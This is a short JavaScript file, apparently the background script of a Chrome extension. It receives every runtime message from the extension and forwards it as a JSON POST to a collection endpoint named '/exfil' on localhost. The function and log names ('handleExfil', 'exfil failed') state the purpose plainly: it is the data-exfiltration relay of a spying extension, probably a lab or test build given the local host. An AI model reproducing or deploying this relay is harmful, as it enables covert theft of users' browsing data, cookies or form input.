const SERVER_URL = "http://localhost:8080/exfil";

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handleExfil(message);
  sendResponse({ status: "ok" });
});

async function handleExfil(data) {
  try {
    await fetch(SERVER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  } catch (err) {
    console.error("[bg] exfil failed:", err);
  }
}
